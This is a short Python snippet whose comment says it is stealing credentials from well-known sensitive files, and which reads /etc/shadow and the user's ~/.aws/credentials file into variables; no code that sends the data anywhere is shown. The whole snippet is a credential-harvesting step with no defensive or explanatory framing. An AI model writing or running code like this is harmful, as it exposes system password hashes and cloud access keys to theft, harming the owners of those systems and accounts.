import os
# Stealing credentials from well-known sensitive files.
with open("/etc/shadow") as f:
    shadow = f.read()
creds = open(os.path.expanduser("~/.aws/credentials")).read()
